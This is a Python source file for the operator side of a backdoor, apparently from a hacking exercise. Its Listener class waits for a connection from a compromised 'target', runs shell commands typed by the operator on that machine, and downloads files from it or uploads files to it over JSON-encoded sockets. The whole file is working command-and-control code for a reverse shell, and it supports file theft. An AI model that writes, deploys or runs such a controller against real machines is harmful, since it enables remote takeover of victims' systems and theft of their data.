import io
import socket
import json
import sys
import base64


class Listener:
    def __init__(self, ipv4, port):
        """
        A standard ctor for listener object,
        creates a socket, then listening and accepting a connection from the target

        :param ipv4: attacker source port
        :type ipv4: str

        :param port: port for connection to open
        :type port: int
        """
        try:

            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)

            self.listener.bind((ipv4, port))
            self.listener.listen(1)
            print("Waiting for incoming connections...\n")

            self.connection, address = self.listener.accept()
            print(f"Target's Address: {address}.")

        except socket.error:

            if self.listener:
                self.listener.close()

            if self.connection:
                self.connection.shutdown(socket.SHUT_RDWR)
                self.connection.close()

            sys.exit(0)

    def send(self, data) -> None:
        """
        this function reliably sends data, serializing it using json

        :param data:
        :type data: list | str
        """
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode())

    def recv(self) -> str:
        """
        this function reliably receives data

        :return: backdoors data
        :rtype: str
        """
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(io.DEFAULT_BUFFER_SIZE)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec(self, command) -> str:
        """
        this function executes terminal commands ("bash")

        :param command: command to execute ON the backdoor
        :type command: list

        :return: the result of the command
        :rtype: str
        """
        self.send(command)

        if command[0] == "exit":
            self.process_exit()

        return self.recv()

    def process_exit(self) -> None:
        """
        this function process the case we want to close the connection,
        both shutdowns and closes sockets
        """
        self.connection.shutdown(socket.SHUT_RDWR)
        self.connection.close()
        sys.exit(0)

    @staticmethod
    def read_file(path) -> bytes:
        """
        this function reads contents of a file

        :param path: path to file
        :type path: str

        :return: full contents of file in bytes
        """
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    @staticmethod
    def write_file(path, content) -> str:
        """
        this function writes into a file

        :param path: path to a file to write
        :type path: str

        :param content: content to write into file
        :type content: str

        :return: success message
        :rtype: str
        """
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "Downloaded successfully.\n"

    def run(self) -> None:
        result = b""
        print(f"Target's OS: {self.recv()}.\n")
        while True:
            try:
                location = self.recv()
                location = location.split("\n")
                location = location[0] + location[1] + location[2]

                command = input(f"{location}$ ")
                command = command.split(" ")
                result = self.exec(command)

                if command[0] == "download" or command == "download":
                    if len(command) != 2:
                        print("Usage: download <file>.")
                        continue
                    result = self.write_file(command[1], result)

                elif command[0] == "upload":
                    if len(command) != 2:
                        print("Usage: upload <file>.\n")
                        continue

                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                    result = self.exec(command)

                print(result)

            except KeyboardInterrupt:
                print("\n")
                self.send("exit")
                self.process_exit()

            except Exception as e:
                print(f"(Listener)Error: {e}.\n")
                continue


if __name__ == "__main__":
    my_listener = Listener("10.9.0.3", 3000)
    my_listener.run()
